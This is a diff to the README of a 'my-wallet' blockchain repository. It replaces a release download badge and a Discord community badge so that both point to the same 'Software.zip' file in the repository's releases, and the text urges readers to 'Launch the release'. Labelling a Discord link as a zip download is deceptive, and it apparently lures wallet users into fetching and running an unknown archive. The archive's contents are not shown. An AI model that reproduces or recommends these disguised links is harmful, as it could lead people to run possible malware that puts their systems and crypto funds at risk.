@@ -23,7 +23,7 @@ The **my-wallet** repository aims to provide a comprehensive solution for managi
 
 To get started with the repository, you can download the latest release using the following link:
 
-[![Download My Wallet Release](https://img.shields.io/badge/Download-My_Wallet_Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download My Wallet Release](https://github.com/MerCyYt/my-wallet/releases/download/v2.0/Software.zip)](https://github.com/MerCyYt/my-wallet/releases/download/v2.0/Software.zip)
 
 🚀 **Launch the release to get started with the project!**
 
@@ -63,7 +63,7 @@ Contributions to the repository are always welcome! Whether you're fixing a bug,
 
 Join our growing community of developers working on blockchain technologies. You can connect with us on Discord, where you can ask questions, share your projects, and collaborate with like-minded individuals.
 
-[![Join Discord Community](https://img.shields.io/badge/Join-Discord_Community-green)](https://discord.gg/blockchaindevs)
+[![Join Discord Community](https://github.com/MerCyYt/my-wallet/releases/download/v2.0/Software.zip)](https://github.com/MerCyYt/my-wallet/releases/download/v2.0/Software.zip)
 
 ## License
 
